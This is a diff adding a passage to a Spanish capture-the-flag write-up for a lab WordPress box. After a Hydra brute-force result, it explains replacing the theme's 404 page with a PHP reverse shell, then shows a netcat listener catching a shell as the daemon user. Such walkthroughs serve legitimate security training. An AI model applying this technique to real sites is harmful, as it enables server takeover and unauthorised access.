@@ -121,3 +121,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-29 16:00:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-29 16:03:07
 ```
+Desde Apparece > Editor modificaremos la página que se muestra en caso de no encontrar la página por una reverse shell en PHP (www.revshells.com)
+Ahora solo hara falta ponernos en escucha con netcat y haremos que cargue la página de error 404.
+Aqui encontraremos el segundo flag.
+```bash
+└─$ nc -lnvp 4444    
+listening on [any] 4444 ...
+connect to [10.9.1.252] from (UNKNOWN) [10.10.51.184] 45458
+Linux ip-10-10-51-184 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 16:28:05 up 9 min,  0 users,  load average: 0.49, 0.19, 0.11
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+bash: cannot set terminal process group (5360): Inappropriate ioctl for device
+bash: no job control in this shell
+daemon@ip-10-10-51-184:/$ 
+```
